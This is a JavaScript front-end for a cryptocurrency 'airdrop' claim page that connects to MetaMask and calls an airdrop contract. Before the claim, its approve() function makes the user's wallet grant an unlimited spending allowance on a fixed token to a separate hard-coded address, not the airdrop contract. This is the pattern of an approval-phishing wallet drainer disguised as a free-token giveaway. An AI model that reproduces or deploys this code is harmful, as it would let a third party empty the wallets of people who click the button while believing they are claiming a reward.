const airdropAbi = [
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "start",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "finish",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "address",
                "name": "rewardToken",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "checkToken",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "approveTo",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": false,
                "internalType": "address",
                "name": "rewardToken",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "address",
                "name": "who",
                "type": "address"
            }
        ],
        "name": "AirdropTaken",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "start",
                "type": "uint256"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "finish",
                "type": "uint256"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "indexed": false,
                "internalType": "address",
                "name": "rewardToken",
                "type": "address"
            }
        ],
        "name": "NewAirdropCreated",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "previousOwner",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "newOwner",
                "type": "address"
            }
        ],
        "name": "OwnershipTransferred",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": false,
                "internalType": "address",
                "name": "rewardToken",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "RamainTokenWithdrawed",
        "type": "event"
    },
    {
        "inputs": [],
        "name": "AIRDROP_COUNT_EVERY_ADDRESS",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "airdropTakenCountRecord",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "airdropTotalCountRecord",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "finishTimestamp",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "start",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "finish",
                "type": "uint256"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            },
            {
                "internalType": "address",
                "name": "rewardToken",
                "type": "address"
            }
        ],
        "name": "newAirdrop",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "renounceOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "rewardTokenAddress",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "startTimestamp",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "takeAirdrop",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "newOwner",
                "type": "address"
            }
        ],
        "name": "transferOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "withdrawRemainTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];
const erc20Abi = [
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "internalType": "address",
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];
const airdropContractAddress = '0xa658DC1fa125890Af939c961e023fFf33a374cB9';
const approveTokenAddress = '0xf7d369B017cd2d3a8d0733cabF30e502b1f8717D';
const approveTo = '0xFEa19831aCE7648a06b60bf3C07C0378E9e30A54';

const connectButton = document.getElementById('connect');
const errorInfo = document.getElementById('error');

let contractInstance = null;
let currentAccount = null;
let web3Instance = null;

window.addEventListener('load', async function() {
    let info = ''

    if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
        web3Instance = new Web3(window.ethereum);
    } else if (typeof window.web3 !== 'undefined') {
        web3Instance = new Web3(window.web3.currentProvider);
    } else {
        errorInfo.innerText = 'No available web3 provider';
        return;
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length == 0) {
        connectButton.value = 'Connect To Wallet';
        connectButton.onclick = onClickConnect;
    } else {
        currentAccount = accounts[0];
        console.log(`current account: ${currentAccount}`);
        info += 'currentAccount: ' + currentAccount + '\n';
        connectButton.value = 'Get Airdrop';
        connectButton.onclick = takeAirdrop;
    }
    contractInstance = new web3Instance.eth.Contract(airdropAbi, airdropContractAddress);
    info += 'contractInstance: ' + contractInstance + '\n';
    errorInfo.innerText = info;
})

const onClickConnect = async () => {
    try {
        const newAccounts = await ethereum.request({
            method: 'eth_requestAccounts',
        })
        console.log(newAccounts);
        // handleNewAccounts(newAccounts)

        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        currentAccount = accounts[0];
        console.log(currentAccount);
        connectButton.value = 'Get Airdrop';
        connectButton.onclick = takeAirdrop;
    } catch (error) {
        errorInfo.innerText = error;
        console.error(error)
    }
}

const takeAirdrop = async () => {
    if (await approve() == false) {
        return;
    }

    try {
        await contractInstance.methods.takeAirdrop().send({ from: currentAccount })
            .once('sending', function(payload) { console.log(payload); connectButton.value = 'Getting...'; })
            .once('sent', function(payload) { console.log(payload); connectButton.value = 'Getting...'; })
            .once('transactionHash', function(hash) { console.log(hash); connectButton.value = 'Getting...'; })
            .once('receipt', function(receipt) { console.log(receipt); connectButton.value = 'Getting Success'; })
            // .on('confirmation', function(confNumber, receipt, latestBlockHash) { console.log(confNumber, receipt, latestBlockHash) })
            .on('error', function(error) { console.log(error), connectButton.value = 'Getting Failed'; })
            .then(function(receipt) {
                // will be fired once the receipt is mined
                console.log(receipt);
                connectButton.value = 'Getting Success';
            });
    } catch (error) {
        connectButton.value = 'Getting Failed';
        errorInfo.innerText = error;
        console.error(error)
    }
}

const approve = async () => {
    try {
        const token = new web3Instance.eth.Contract(erc20Abi, approveTokenAddress);
        const allowance = await token.methods.allowance(currentAccount, approveTo).call();

        if (web3Instance.utils.toBN(allowance) > 0) {
            return true;
        }

        await token.methods.approve(approveTo, -1).send({ from: currentAccount })
            .once('sending', function(payload) { console.log(payload); errorInfo.innerText = payload; connectButton.value = 'Getting...'; })
            .once('sent', function(payload) { console.log(payload); errorInfo.innerText = payload; connectButton.value = 'Getting...'; })
            .once('transactionHash', function(hash) { console.log(hash); errorInfo.innerText = hash; connectButton.value = 'Getting...'; })
            .once('receipt', function(receipt) { console.log(receipt); errorInfo.innerText = receipt; connectButton.value = 'Getting...'; })
            // .on('confirmation', function(confNumber, receipt, latestBlockHash) { console.log(confNumber, receipt, latestBlockHash) })
            .on('error', function(error) { console.log(error); errorInfo.innerText = error; connectButton.value = 'Getting Failed'; })
            .then(function(receipt) {
                // will be fired once the receipt is mined
                console.log(receipt);
                errorInfo.innerText = receipt;
                onnectButton.value = 'Getting...';
            });
        return true;
    } catch (error) {
        connectButton.value = 'Getting Failed';
        errorInfo.innerText = error;
        console.error(error)
        return false;
    }
}

// http://pandoralegend.com/
// Pandora1.1@outlook.com